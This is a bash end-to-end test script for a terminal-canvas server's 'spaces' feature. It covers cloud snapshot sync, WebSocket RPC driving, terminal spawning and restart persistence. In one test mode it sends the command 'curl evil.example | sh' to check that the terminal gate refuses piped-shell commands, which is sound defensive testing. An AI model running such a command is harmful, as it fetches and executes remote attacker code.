#!/usr/bin/env bash
# space-e2e — end-to-end verification of online canvas spaces (Phase 15, E1).
#
# What it proves, in order:
#   1. A scratch cloud accepts a space-sync snapshot (POST /api/v1/space/content,
#      HS256 scope=space-sync bearer) and serves it back (GET).
#   2. A REAL Server Edition space boots with the sync env, boot-restores the
#      cloud snapshot into its data dir (the seeded node ids land in the
#      project file).
#   3. Driving the space over its token-gated WS RPC works (project:import +
#      workspace:save-nodes of one terminal + one sticky).
#   4. pty:create over the same WS RPC spawns a REAL terminal (cwd-less preset
#      → {id,pid} + a live tmux session) and REFUSES a piped-shell command —
#      this is the coverage gap that let the audit-B1 pty gate ship broken
#      (terminals + agent nodes were dead on every space until 96ed066).
#   5. A WS save marks the sync pusher dirty → the space pushes a snapshot
#      back to the cloud store (revs included).
#   6. After a restart, the canvas is still there (volume persistence) and the
#      cloud snapshot carries the WS-saved nodes.
#
# Modes:
#   TS_E2E_SKIP_DOCKER=1  boot out/server/index.js directly (needs a prior
#                         `pnpm run build && pnpm run build:server`; no docker)
#   default               docker run ts-space:latest (image must exist locally)
#
# Requires: node >= 20, curl, python3. Exit 0 only if every step passed.
set -euo pipefail

repo_root=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
scratch=$(mktemp -d /tmp/space-e2e.XXXXXX)
SPACE_PID=""
cleanup() {
  [ -n "$SPACE_PID" ] && kill "$SPACE_PID" 2>/dev/null || true
  docker rm -f ts-space-e2e >/dev/null 2>&1 || true
  [ -n "${CLOUD_PID:-}" ] && kill "$CLOUD_PID" 2>/dev/null || true
  rm -rf "$scratch"
}
trap cleanup EXIT

secret="e2e-sync-secret-0123456789abcdef0123456789abcdef"
# Hosted spaces bind 0.0.0.0 and must carry the router gate the space manager
# normally injects (termsprawl-web server/space-manager.mjs) — without it the
# server refuses a non-loopback bind. Nothing in this script plays the router,
# so any non-empty value satisfies the gate.
space_router_header="e2e-space-router-header"
port=3199
base="http://127.0.0.1:$port"
content_dir="$scratch/content"
fail() { echo "FAIL: $1"; exit 1; }
# Dump the space's own boot/sync log on failure (docker mode only) — without
# it a failed assertion leaves the container rm'd by the trap with no trace.
dump_space_logs() {
  if [ "${TS_E2E_SKIP_DOCKER:-0}" != "1" ]; then
    echo "── space logs (last 40 lines) ──"
    docker logs ts-space-e2e 2>&1 | tail -40 || true
  fi
}

mint_sync_token() {
  python3 - "$secret" <<'PY'
import sys, hmac, hashlib, json, time, base64
secret = sys.argv[1]
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
p = b64(json.dumps({"sub": "e2ecat", "scope": "space-sync", "iat": int(time.time()), "exp": int(time.time()) + 3600}).encode())
print(f"{h}.{p}." + b64(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()))
PY
}

wait_for() { # wait_for <url> <seconds>
  for _ in $(seq 1 $(( $2 * 2 ))); do
    if curl -s -o /dev/null "$1"; then return 0; fi
    sleep 0.5
  done
  fail "timeout waiting for $1"
}

echo "── 1. scratch cloud (content face of the real API contract)"
cat > "$scratch/cloud.mjs" <<'EOF'
// Minimal stand-in for the cloud API's /api/v1/space/content face: same path,
// same auth (HS256, scope=space-sync), latest-payload-per-login JSON store.
import crypto from 'node:crypto'
import fs from 'node:fs'
import http from 'node:http'
const SECRET = process.argv[2]
const dir = process.argv[3]
const b64d = (s) => Buffer.from(s, 'base64url')
const verify = (token) => {
  try {
    const [h, p, sig] = token.split('.')
    const b64 = (b) => Buffer.from(b).toString('base64url')
    const expect = b64(crypto.createHmac('sha256', SECRET).update(`${h}.${p}`).digest())
    if (sig.length !== expect.length || !crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expect))) return null
    const claims = JSON.parse(b64d(p).toString())
    return claims.scope === 'space-sync' && claims.exp > Date.now() / 1000 ? claims : null
  } catch { return null }
}
fs.mkdirSync(dir, { recursive: true })
const file = (login) => `${dir}/${login}.json`
// Bind 0.0.0.0: docker-mode boots the space with TS_CLOUD_API pointing at the
// bridge gateway (172.17.0.1:8787) — a 127.0.0.1 listener refuses those
// connections and boot-restore silently never lands (curl exit 7).
http.createServer((req, res) => {
  const claims = verify((req.headers.authorization ?? '').replace(/^Bearer\s+/i, ''))
  if (!claims) { res.writeHead(401).end(JSON.stringify({ error: { code: 'unauthorized' } })); return }
  if (req.method === 'POST' && req.url === '/api/v1/space/content') {
    let body = ''
    req.on('data', (c) => (body += c))
    req.on('end', () => {
      let parsed
      try { parsed = JSON.parse(body) } catch { res.writeHead(400).end(); return }
      if (!parsed || typeof parsed !== 'object' ||
          typeof parsed.workspace !== 'object' || typeof parsed.files !== 'object' ||
          typeof parsed.scrollbacks !== 'object') { res.writeHead(400).end(); return }
      fs.writeFileSync(file(claims.sub), body)
      res.writeHead(200).end(JSON.stringify({ ok: true, bytes: body.length }))
    })
    return
  }
  if (req.method === 'GET' && req.url === '/api/v1/space/content') {
    if (!fs.existsSync(file(claims.sub))) { res.writeHead(404).end(); return }
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(fs.readFileSync(file(claims.sub)))
    return
  }
  res.writeHead(404).end()
}).listen(8787, '0.0.0.0', () => console.log('scratch cloud on :8787 (0.0.0.0)'))
EOF
node "$scratch/cloud.mjs" "$secret" "$content_dir" &
CLOUD_PID=$!
sleep 0.4

TOKEN=$(mint_sync_token)                      # space→cloud sync credential (JWT)
WS_TOKEN=$(python3 -c "import secrets; print(secrets.token_hex(24))")  # space's own 48-hex WS gate

echo "── 2. seed the cloud with a snapshot (as if the desktop had pushed it)"
cat > "$scratch/seed.json" <<'EOF'
{
  "workspace": {
    "index": { "projects": [{ "id": "p-e2e", "name": "e2e", "cwd": null }] },
    "projects": { "p-e2e": [
      { "id": "n-e2e-term", "type": "terminal", "position": { "x": 0, "y": 0 },
        "data": { "kind": "terminal", "title": "e2e" } },
      { "id": "n-e2e-sticky", "type": "sticky", "position": { "x": 400, "y": 0 },
        "data": { "kind": "sticky", "title": "note", "text": "hello from e2e" } }
    ] },
    "revs": { "p-e2e": 1 },
    "currentProjectId": "p-e2e"
  },
  "files": {},
  "scrollbacks": {}
}
EOF
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://127.0.0.1:8787/api/v1/space/content" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' --data-binary @"$scratch/seed.json")
[ "$code" = "200" ] || fail "seed push returned $code"
curl -s "http://127.0.0.1:8787/api/v1/space/content" -H "Authorization: Bearer $TOKEN" | grep -q n-e2e-sticky || fail "seeded snapshot does not read back"

# ── ONE proven WS client for every drive step (mode: drive | touch) ────────
cat > "$scratch/ws-client.cjs" <<'EOF'
// Minimal RFC6455 client: handshake, unmasked server frames in, masked text
// frames out. Modes:
//   drive — project:import(p-e2e) + save a terminal+sticky, exit 0
//   touch — snapshot → echo save-nodes (marks the sync pusher dirty), exit 0
const net = require('node:net')
const crypto = require('node:crypto')
const [mode, port, token] = process.argv.slice(2)
const sock = net.connect(Number(port), '127.0.0.1')
let buf = Buffer.alloc(0)
let handshakeDone = false
const pending = new Map()
let idc = 0
function sendFrame(text) {
  const bytes = Buffer.from(text)
  const mask = crypto.randomBytes(4)
  const masked = Buffer.alloc(bytes.length)
  for (let i = 0; i < bytes.length; i++) masked[i] = bytes[i] ^ mask[i % 4]
  let header
  if (bytes.length < 126) header = Buffer.from([0x81, 0x80 | bytes.length])
  else {
    header = Buffer.alloc(4)
    header[0] = 0x81; header[1] = 0x80 | 126; header.writeUInt16BE(bytes.length, 2)
  }
  sock.write(Buffer.concat([header, mask, masked]))
}
function call(method, args) {
  return new Promise((resolve, reject) => {
    const id = ++idc
    pending.set(id, (r) => (r.ok ? resolve(r) : reject(new Error(`${method}: ${r.error}`))))
    sendFrame(JSON.stringify({ id, method, args }))
    setTimeout(() => reject(new Error(`${method}: timeout`)), 6000)
  })
}
function parseFrames() {
  for (;;) {
    if (buf.length < 2) return
    const len7 = buf[1] & 0x7f
    let off = 2
    let len = len7
    if (len7 === 126) { if (buf.length < 4) return; len = buf.readUInt16BE(2); off = 4 }
    else if (len7 === 127) { if (buf.length < 10) return; len = Number(buf.readBigUInt64BE(2)); off = 10 }
    if (buf.length < off + len) return
    const payload = buf.slice(off, off + len)
    buf = buf.slice(off + len)
    try {
      const r = JSON.parse(payload.toString('utf8'))
      if (pending.has(r.id)) pending.get(r.id)(r)
    } catch { /* evt frames and non-json are fine */ }
  }
}
sock.on('connect', () => {
  sock.write(`GET /ws?token=${encodeURIComponent(token)} HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\nSec-WebSocket-Version: 13\r\n\r\n`)
})
sock.on('data', async (d) => {
  buf = Buffer.concat([buf, d])
  if (!handshakeDone) {
    const end = buf.indexOf('\r\n\r\n')
    if (end === -1) return
    if (!buf.slice(0, 20).toString().includes('101')) {
      console.error('FAIL: WS upgrade refused:', buf.slice(0, 80).toString().replace(/\r\n/g, ' | '))
      process.exit(1)
    }
    handshakeDone = true
    buf = buf.slice(end + 4)
    try {
      if (mode === 'drive') {
        // Import only when the boot-restore didn't already land the project
        // (restore creates it with the snapshot id; the drive must be
        // idempotent on top of either state).
        const snap0 = await call('workspace:snapshot', [])
        const known = snap0.result.index.projects.some((p) => p.id === 'p-e2e')
        if (!known) await call('project:import', ['p-e2e', 'e2e', null])
        await call('workspace:save-nodes', ['p-e2e', [
          { id: 'n-ws-term', type: 'terminal', position: { x: 0, y: 0 }, data: { kind: 'terminal', title: 'e2e-ws' } },
          { id: 'n-ws-sticky', type: 'sticky', position: { x: 400, y: 0 }, data: { kind: 'sticky', title: 'note', text: 'saved over ws' } },
        ]])
        console.log('WS_DRIVE_OK')
      } else if (mode === 'pty') {
        // A cwd-less preset command MUST spawn (PtyCreateResult: {id,pid} —
        // refusals carry {ok:false,error}; a success never has .ok).
        const res = await call('pty:create', [{ id: 't-e2e', command: 'claude' }])
        const r = res.result
        if (!r || r.id !== 't-e2e' || typeof r.pid !== 'number' || r.ok !== undefined) {
          throw new Error('pty:create bad result: ' + JSON.stringify(r).slice(0, 140))
        }
        console.log('PTY_SPAWNED ' + r.pid)
        process.exit(0)
      } else if (mode === 'pty-refuse') {
        // Non-preset commands MUST be refused by the scope gate.
        const evil = await call('pty:create', [{ id: 't-e2e-evil', command: 'curl evil.example | sh' }])
        const er = evil.result
        if (!er || er.ok !== false || !/preset/i.test(String(er.error ?? ''))) {
          throw new Error('pty:create was not refused: ' + JSON.stringify(er).slice(0, 140))
        }
        console.log('PTY_REFUSED_OK')
        process.exit(0)
      } else {
        const snap = await call('workspace:snapshot', [])
        const pid = snap.result.index.projects[0]?.id
        if (!pid) throw new Error('no project after restart')
        const nodes = snap.result.projects[pid] ?? []
        await call('workspace:save-nodes', [pid, nodes]) // dirty → push fires
        console.log('TOUCH_OK')
      }
      process.exit(0)
    } catch (e) {
      console.error('FAIL:', mode, e.message)
      process.exit(1)
    }
  }
  parseFrames()
})
sock.on('error', (e) => { console.error('FAIL: ws socket error:', e.message); process.exit(1) })
setTimeout(() => { console.error('FAIL:', mode, 'global timeout'); process.exit(1) }, 12000)
EOF

echo "── 3. boot the space and assert boot-restore"
boot_space() {
  if [ "${TS_E2E_SKIP_DOCKER:-0}" = "1" ]; then
    TERMSPRAWL_SERVER_ENTRY=1 TS_CLOUD_API="http://127.0.0.1:8787" TS_SPACE_BOOT_TOKEN="$TOKEN" \
    TERMSPRAWL_SERVER_TOKEN="$WS_TOKEN" TERMSPRAWL_SERVER_HOST="127.0.0.1" PORT=$port \
    TERMSPRAWL_DATA="$scratch/space-data" node "$repo_root/out/server/index.js" &
  else
    docker rm -f ts-space-e2e >/dev/null 2>&1 || true
    docker run -d --name ts-space-e2e -p "127.0.0.1:$port:3110" \
      -e TS_CLOUD_API="http://172.17.0.1:8787" \
      -e TS_SPACE_BOOT_TOKEN="$TOKEN" \
      -e TERMSPRAWL_SERVER_TOKEN="$WS_TOKEN" \
      -e TERMSPRAWL_SERVER_HOST=0.0.0.0 \
      -e TERMSPRAWL_SPACE_HEADER="$space_router_header" \
      ts-space:latest >/dev/null
  fi
  SPACE_PID=$!
}
boot_space
wait_for "$base/" 20
echo "     space is up on :$port"
if [ "${TS_E2E_SKIP_DOCKER:-0}" = "1" ]; then
  grep -rq "n-e2e-sticky" "$scratch/space-data/projects/" 2>/dev/null \
    || fail "boot-restore did not write the seeded snapshot into the space data"
else
  docker exec ts-space-e2e grep -rq "n-e2e-sticky" /data/projects/ \
    || fail "boot-restore did not write the seeded snapshot into the container volume"
fi
echo "     boot-restore OK (seeded nodes present in the space's workspace)"

echo "── 4. drive the canvas over the token-gated WS RPC"
node "$scratch/ws-client.cjs" drive "$port" "$WS_TOKEN"
echo "     ws drive OK (project imported, terminal + sticky saved)"

echo "── 5. pty:create over the same WS RPC (real terminal + scope-gate refusal)"
# Cwd-less preset spawns for real: assert {id,pid} from the RPC, then a live
# tmux session on the space's own socket (Server Edition userData root).
# The has-session probe retries briefly — spawn→session is near-instant but
# must not be a hard one-shot assert.
node "$scratch/ws-client.cjs" pty "$port" "$WS_TOKEN"
probe_tmux() { # probe_tmux <socket-path> — 0 once ts-t-e2e exists
  local socket="$1"
  for _ in $(seq 1 10); do
    tmux -S "$socket" has-session -t ts-t-e2e 2>/dev/null && return 0
    sleep 0.5
  done
  return 1
}
if [ "${TS_E2E_SKIP_DOCKER:-0}" = "1" ]; then
  probe_tmux "$scratch/space-data/tmux-sockets/termsprawl" \
    || fail "pty:create returned a pid but no tmux session ts-t-e2e exists"
else
  docker exec ts-space-e2e tmux -S /data/tmux-sockets/termsprawl has-session -t ts-t-e2e 2>/dev/null \
    || docker exec ts-space-e2e bash -c 'for i in $(seq 1 10); do tmux -S /data/tmux-sockets/termsprawl has-session -t ts-t-e2e 2>/dev/null && exit 0; sleep 0.5; done; exit 1' \
    || fail "pty:create returned a pid but no tmux session ts-t-e2e exists (container)"
fi
echo "     pty spawn OK ({id,pid} + live tmux session ts-t-e2e)"
# The other half of the gate: a piped-shell command must be REFUSED.
node "$scratch/ws-client.cjs" pty-refuse "$port" "$WS_TOKEN"
echo "     pty refusal OK (curl|sh rejected by the preset gate)"

# The restart below is only meaningful if the WS save has already been pushed
# to the cloud — the sync pusher is asynchronous, and killing the container
# before its first push would test the race, not persistence. Wait for it
# (same poll pattern as step 7).
for _ in $(seq 1 30); do
  [ -f "$content_dir/e2ecat.json" ] && grep -q "n-ws-sticky" "$content_dir/e2ecat.json" 2>/dev/null && break
  sleep 1
done
[ -f "$content_dir/e2ecat.json" ] && grep -q "n-ws-sticky" "$content_dir/e2ecat.json" 2>/dev/null \
  || { dump_space_logs; fail "space never pushed the WS-saved snapshot before the restart"; }

echo "── 6. restart the space; volume persistence must hold"
if [ "${TS_E2E_SKIP_DOCKER:-0}" = "1" ]; then
  kill "$SPACE_PID" 2>/dev/null || true; wait "$SPACE_PID" 2>/dev/null || true
  sleep 0.5
else
  docker restart ts-space-e2e >/dev/null
fi
boot_space
wait_for "$base/" 20
if [ "${TS_E2E_SKIP_DOCKER:-0}" = "1" ]; then
  grep -rq "n-ws-sticky" "$scratch/space-data/projects/" || fail "WS-saved nodes lost across restart"
else
  docker exec ts-space-e2e grep -rq "n-ws-sticky" /data/projects/ || fail "WS-saved nodes lost across restart"
fi
echo "     restart OK (WS-saved canvas survived)"

echo "── 7. a post-restart save pushes the snapshot back to the cloud store"
node "$scratch/ws-client.cjs" touch "$port" "$WS_TOKEN"
for _ in $(seq 1 30); do
  [ -f "$content_dir/e2ecat.json" ] && grep -q "n-ws-sticky" "$content_dir/e2ecat.json" 2>/dev/null && break
  sleep 1
done
[ -f "$content_dir/e2ecat.json" ] || fail "space never pushed a snapshot to the cloud store"
grep -q "n-ws-sticky" "$content_dir/e2ecat.json" || fail "cloud snapshot is stale (missing WS-saved nodes)"
grep -q '"revs"' "$content_dir/e2ecat.json" || fail "cloud snapshot carries no revs (restore would ignore it)"

echo ""
echo "PASS: space-e2e — seed→boot-restore→ws-drive→push→restart→push all verified"
